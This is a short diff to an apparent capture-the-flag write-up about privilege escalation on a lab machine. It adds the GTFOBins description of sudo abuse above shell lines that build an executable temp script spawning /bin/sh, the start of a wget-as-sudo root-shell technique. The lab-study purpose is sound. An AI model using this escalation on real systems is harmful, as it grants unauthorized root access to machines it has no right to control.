@@ -356,6 +356,9 @@ I used [GTFOBins](https://gtfobins.github.io/) to privilege Escalation </br>
 ![wget_as_sudo](images/sunday/wget_as_sudo.png)
 
 ```
+Sudo
+If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
+
 TF=$(mktemp)
 chmod +x $TF
 echo -e '#!/bin/sh\n/bin/sh 1>&0' >$TF
